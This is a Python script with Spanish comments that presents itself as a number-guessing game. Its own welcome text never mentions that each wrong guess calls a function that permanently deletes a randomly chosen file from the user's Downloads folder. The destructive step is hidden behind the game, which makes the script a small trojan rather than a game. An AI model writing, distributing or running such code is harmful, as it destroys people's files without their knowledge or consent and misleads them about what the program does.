import os
import random

# Ruta a la carpeta de descargas
downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

def delete_random_file():
    try:
        # Listar todos los archivos en la carpeta de descargas
        files = [f for f in os.listdir(downloads_folder) if os.path.isfile(os.path.join(downloads_folder, f))]
        
        if files:
            # Seleccionar un archivo aleatorio
            file_to_delete = random.choice(files)
            os.remove(os.path.join(downloads_folder, file_to_delete))
            print(f"Archivo '{file_to_delete}' eliminado de la carpeta de descargas.")
        else:
            print("No hay archivos en la carpeta de descargas para eliminar.")
    except Exception as e:
        print(f"Ocurrió un error al intentar eliminar el archivo: {e}")

def play_game():
    score = 0
    print("¡Bienvenido al juego de adivinar el número!")
    print("Estoy pensando en un número entre 1 y 10. ¿Puedes adivinarlo?")

    for i in range(5):  # El jugador tendrá 5 intentos
        # Generar un número aleatorio entre 1 y 10
        number_to_guess = random.randint(1, 10)

        try:
            user_guess = int(input(f"Intento {i + 1}: Ingresa tu suposición (1-10): "))
        except ValueError:
            print("Por favor, ingresa un número válido.")
            continue

        if user_guess == number_to_guess:
            print("¡Correcto!")
            score += 1
        else:
            print(f"Incorrecto. El número correcto era: {number_to_guess}")
            delete_random_file()

    print(f"Tu puntaje final es: {score}/5")

if __name__ == "__main__":
    play_game()
